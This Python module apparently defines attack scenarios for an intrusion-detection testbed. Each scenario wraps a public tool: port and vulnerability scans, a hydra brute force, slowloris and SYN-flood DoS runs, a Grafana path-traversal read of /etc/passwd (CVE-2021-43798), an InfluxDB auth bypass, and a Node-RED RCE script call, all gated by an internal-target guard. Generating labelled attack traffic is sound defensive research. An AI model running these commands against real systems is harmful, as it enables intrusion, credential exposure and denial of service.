"""Attack scenarios, mirroring the ICS3D container classes and the common IIS3D
families. Each scenario is a thin, declarative wrapper around a standard public
tool. A scenario:

  * resolves and guards its target (internal only),
  * optionally shapes its own egress with tc/netem (the evasion knobs),
  * runs the tool,
  * and reports whether its functionality oracle still passes.

Scenarios are intentionally orchestration only: they invoke nmap/nuclei/hydra/
slowloris/hping3, they do not implement attacks themselves. The oracle lives in
oracle.py; the knobs live in ../evasion/transforms.py.
"""
from __future__ import annotations

import os
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

from guard import assert_internal

OUT = Path(os.environ.get("RUN_OUT", "/out"))


def _env(name: str) -> str:
    v = os.environ.get(name)
    if not v:
        raise SystemExit(f"scenarios: target {name} not set (source targets.env)")
    return v


def run(cmd: list[str], timeout: int, log: str) -> subprocess.CompletedProcess:
    OUT.mkdir(parents=True, exist_ok=True)
    with open(OUT / log, "w") as fh:
        return subprocess.run(cmd, stdout=fh, stderr=subprocess.STDOUT,
                              timeout=timeout, text=True)


@dataclass
class Scenario:
    name: str
    family: str                       # maps to a testbed class label
    target_env: str                   # which targets.env entry
    build: Callable[[str, int], list[str]]   # (host, port) -> argv
    timeout: int = 120
    oracle: str = ""                  # name in oracle.py; "" -> run counts if tool exits 0

    def host_port(self) -> tuple[str, int]:
        hp = _env(self.target_env)
        host, port = hp.rsplit(":", 1)
        assert_internal(host)         # abort if not internal
        return host, int(port)


SCENARIOS: list[Scenario] = [
    Scenario(
        "recon-nmap", "Reconnaissance", "BOUTIQUE",
        lambda h, p: ["nmap", "-sT", "-sV", "-p-", "--open", "-oN", str(OUT / "nmap.txt"), h],
        timeout=300, oracle="scan_ports"),
    Scenario(
        "vulnscan-nuclei", "VulnerabilityScan", "GRAFANA",
        lambda h, p: ["nuclei", "-u", f"http://{h}:{p}", "-silent",
                      "-jsonl", "-o", str(OUT / "nuclei.jsonl")],
        timeout=600, oracle="nuclei_hit"),
    Scenario(
        "bruteforce-ssh", "DictionaryBruteForce", "NODE_RED",
        # hydra against an SSH sidecar if present; falls back to HTTP form on node-red
        lambda h, p: ["hydra", "-l", "admin", "-P", "/opt/attacker/wordlist.txt",
                      "-f", "-o", str(OUT / "hydra.txt"), f"http-get://{h}:{p}/"],
        timeout=300, oracle="credential_found"),
    Scenario(
        "dos-slowloris", "DoS-SlowLoris", "BOUTIQUE",
        lambda h, p: ["slowloris", h, "-p", str(p), "-s", "200", "--sleeptime", "15"],
        timeout=120, oracle="latency_up"),
    Scenario(
        "dos-synflood", "DDoS-SYN_Flood", "BOUTIQUE",
        # hping3 SYN flood, RATE-LIMITED via --interval (and tc on the pod); never --flood
        lambda h, p: ["hping3", "-S", "-p", str(p), "-i", "u500", "-c", "20000", h],
        timeout=90, oracle="latency_up"),
    Scenario(
        "exploit-grafana-traversal", "web", "GRAFANA",
        # CVE-2021-43798 path traversal: read a known file as the functionality marker
        lambda h, p: ["curl", "-s", "-o", str(OUT / "grafana_leak.txt"),
                      f"http://{h}:{p}/public/plugins/alertlist/../../../../../../../../etc/passwd"],
        timeout=60, oracle="file_read"),
    Scenario(
        "exploit-influx-authbypass", "web", "INFLUXDB",
        # CVE-2019-20933 auth bypass: list databases as the marker
        lambda h, p: ["curl", "-s", "-o", str(OUT / "influx_db.txt"),
                      f"http://{h}:{p}/query?q=SHOW+DATABASES"],
        timeout=60, oracle="influx_listed"),
    Scenario(
        "exploit-nodered-rce", "web", "NODE_RED",
        # Node-RED admin-API flow deploy; the oracle checks for the RCE marker file
        lambda h, p: ["python3", "/opt/attacker/nodered_rce.py", h, str(p),
                      str(OUT / "rce_marker.txt")],
        timeout=90, oracle="rce_marker"),
]


BY_NAME = {s.name: s for s in SCENARIOS}
